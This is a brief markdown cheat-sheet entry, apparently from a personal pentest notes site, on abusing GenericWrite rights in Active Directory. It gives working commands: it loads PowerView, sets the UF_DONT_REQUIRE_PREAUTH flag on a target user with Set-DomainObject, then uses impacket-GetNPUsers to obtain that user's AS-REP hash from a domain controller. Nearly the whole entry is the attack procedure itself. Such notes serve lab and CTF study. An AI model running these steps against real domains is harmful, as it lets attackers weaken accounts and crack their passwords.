---
title: "GenericWrite"
date: 2024-7-13
tags: ["GenericWrite", "active driectory", "ad", "Windows"]
---

---
### Using PowerView.ps1 

```powershell
. .\PowerView.ps1
```

### Add UF_DONT_REQUIRE_PREAUTH bit

```powershell
# Check target user
Get-DomainUser user | ConvertFrom-UACValue
```

```powershell
Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose
```

#### Get hash

```bash
# In local linux machine
impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10
```

<br>